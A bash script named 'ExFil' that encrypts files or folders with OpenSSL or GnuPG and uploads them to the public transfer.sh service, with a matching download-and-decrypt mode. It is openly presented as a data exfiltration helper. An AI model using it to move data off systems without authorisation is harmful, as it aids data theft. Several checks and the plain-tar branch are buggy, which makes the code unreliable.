#!/usr/bin/env bash
# shellcheck disable=SC2034

# ExFil
#
# Encrypt and exfil data using OpenSSL or GnuPG
# and the 'transfer.sh' service.
#
# Made by Jiab77
# Based on the awesome work done by THC.
#
# Todo:
# - Implement 'tor' support
# - Implement 'gpg' support
#
# Version 0.0.4

# Options
set +o xtrace

# Config
SVC_NAME="transfer.sh"
SVC_URL="https://transfer.sh"
ENC_ALGO_OSSL="chacha20"
ENC_ALGO_GPG="aes256"
ALLOW_FOLDERS=true
USE_TOR=false
TOR_PROXY="socks5h://127.0.0.1:9050"

# Internals
SCR_NAME="$(basename "$0")"
BIN_CURL=$(which curl 2>/dev/null)
BIN_WGET=$(which wget 2>/dev/null)
BIN_OSSL=$(which openssl 2>/dev/null)
BIN_GPG=$(which gpg 2>/dev/null)
BIN_SRM=$(which srm 2>/dev/null)
BIN_TAR=$(which tar 2>/dev/null)
BIN_XZ=$(which xz 2>/dev/null)
BIN_ZIP=$(which zip 2>/dev/null)

# Functions
function die() {
    echo -e "\nError: $1\n" >&2
    exit 255
}
function enc_file() {
    if [[ -n $BIN_CURL ]]; then
        if [[ $USE_TOR == false ]]; then
            if [[ -n $BIN_OSSL ]]; then
                openssl "$ENC_ALGO_OSSL" -pbkdf2 -e -in "$1" | curl -X PUT -fsSL --progress-bar --upload-file "-" "$SVC_URL"/"$(basename "$1")"
            else
                gpg -ac --cipher-algo="$ENC_ALGO_GPG" -o- "$1" | curl -X PUT -fsSL --progress-bar --upload-file "-" "$SVC_URL"/"$(basename "$1")"
            fi
        else
            die "Tor support is not implemented yet, please set 'USE_TOR' to 'false' without quotes."
        fi
    else
        local TMP_FILE ; TMP_FILE="$(mktemp)"
        if [[ $USE_TOR == false ]]; then
            if [[ -n $BIN_OSSL ]]; then
                openssl "$ENC_ALGO_OSSL" -pbkdf2 -e -in "$1" -out "$TMP_FILE" | wget --method PUT --body-file="$TMP_FILE" "$SVC_URL"/"$(basename "$1")" -O - -nv --progress=bar:force:noscroll
            else
                gpg -ac --cipher-algo "$ENC_ALGO_GPG" -o "$TMP_FILE" "$1" | wget --method PUT --body-file="$TMP_FILE" "$SVC_URL"/"$(basename "$1")" -O - -nv --progress=bar:force:noscroll
            fi
        else
            die "Tor support is not implemented yet, please set 'USE_TOR' to 'false' without quotes."
        fi
        [[ -f "$TMP_FILE" && -n "$BIN_SRM" ]] && srm -f "$TMP_FILE"
        [[ -f "$TMP_FILE" && -z "$BIN_SRM" ]] && rm -f "$TMP_FILE"
    fi
}
function enc_folder() {
    local ARCHIVE_FILE
    ([[ -z "$ARCHIVE_FILE" && -n "$BIN_TAR" && -n "$BIN_XZ" ]] && tar cf - "$1" | xz -z -9 -e -T 0 -vv -c - > "$1.tar.xz") && ARCHIVE_FILE="$1.tar.xz"
    ([[ -z "$ARCHIVE_FILE" && -n "$BIN_TAR" ]] && tar cf - "$1" "$1.tar") && ARCHIVE_FILE="$1.tar"
    ([[ -z "$ARCHIVE_FILE" && -n "$BIN_ZIP" ]] && zip -r "$1.zip" "$1") && ARCHIVE_FILE="$1.zip"
    if [[ -r "$ARCHIVE_FILE" ]]; then
        enc_file "$ARCHIVE_FILE"
    else
        die "Could not find created archive from folder '$ARCHIVE_FILE'."
    fi
}
function enc_upload() {
    echo -e "\nEncrypt / Upload...\n"
    if [[ -d "$1" ]]; then
        if [[ $ALLOW_FOLDERS == true ]]; then
            enc_folder "$1"
        else
            die "You must enable folder support by setting 'ALLOW_FOLDERS' to 'true' without quotes."
        fi
    else
        enc_file "$1"
    fi
}
function enc_download() {
    echo -e "\nDownload / Decrypt...\n"
    if [[ -n $BIN_CURL ]]; then
        if [[ $USE_TOR == false ]]; then
            if [[ -n $BIN_OSSL ]]; then
                curl -fsSL --progress-bar "$1" | openssl "$ENC_ALGO_OSSL" -pbkdf2 -d > "$(basename "$1")"
            else
                curl -fsSL --progress-bar "$1" | gpg -o- > "$(basename "$1")"
            fi
        else
            die "Tor support is not implemented yet, please set 'USE_TOR' to 'false' without quotes."
        fi
    else
        if [[ $USE_TOR == false ]]; then
            if [[ -n $BIN_OSSL ]]; then
                wget -q --progress=bar:force:noscroll "$1" -O - | openssl "$ENC_ALGO_OSSL" -pbkdf2 -d > "$(basename "$1")"
            else
                wget -q --progress=bar:force:noscroll "$1" -O - | gpg -o- > "$(basename "$1")"
            fi
        else
            die "Tor support is not implemented yet, please set 'USE_TOR' to 'false' without quotes."
        fi
    fi
    # TODO: Add file extension detection to ask for decompressing archives
}
function print_missing() {
    die "Missing '$1' binary. Please install any supported one."
}
function print_usage() {
    if [[ $ALLOW_FOLDERS == true ]]; then
        die "Usage: $SCR_NAME <file|folder> - Encrypt and send file or folder to '$SVC_NAME'."
    else
        die "Usage: $SCR_NAME <file> - Encrypt and send file to '$SVC_NAME'."
    fi
}
function print_help() {
    if [[ $ALLOW_FOLDERS == true ]]; then
        echo -e "\nUsage: $SCR_NAME <file|folder> - Encrypt and send file or folder to '$SVC_NAME'."
        echo -e "\nArguments:"
        echo -e "  -h | --help\t\t Print this help message"
        echo -e "  -s | --send\t\t Encrypt and send file or folder to '$SVC_NAME' (default)"
        echo -e "  -d | --download\t Download and decrypt file from '$SVC_NAME'"
        echo -e "\nExamples:"
        echo -e "  * $SCR_NAME <file|folder>"
        echo -e "  * $SCR_NAME -s <file|folder>"
        echo -e "  * $SCR_NAME -d <url>"
    else
        echo -e "\nUsage: $SCR_NAME <file> - Encrypt and send file to '$SVC_NAME'."
        echo -e "\nArguments:"
        echo -e "  -h | --help\t\t Print this help message"
        echo -e "  -s | --send\t\t Encrypt and send file to '$SVC_NAME' (default)"
        echo -e "  -d | --download\t Download and decrypt file from '$SVC_NAME'"
        echo -e "\nExamples:"
        echo -e "  * $SCR_NAME <file>"
        echo -e "  * $SCR_NAME -s <file>"
        echo -e "  * $SCR_NAME -d <url>"
    fi
    exit 0
}

# Checks
[[ $# -eq 0 ]] && print_usage
[[ $1 == "-h" || $1 == "--help" ]] && print_help
[[ -z $BIN_CURL || -z $BIN_WGET ]] && print_missing "curl' or 'wget"
[[ -z $BIN_OSSL || -z $BIN_GPG ]] && print_missing "openssl' or 'gpg"

# Main
if [[ $# -eq 1 && -r "$1" ]]; then
    enc_upload "$1"
elif [[ $# -eq 2 && ($1 == "-s" || $1 == "--send") ]]; then
    shift
    enc_upload "$1"
elif [[ $# -eq 2 && ($1 == "-d" || $1 == "--download") ]]; then
    shift
    enc_download "$1"
else
    echo -e "\nError: Invalid argument given.\n"
    print_usage
fi
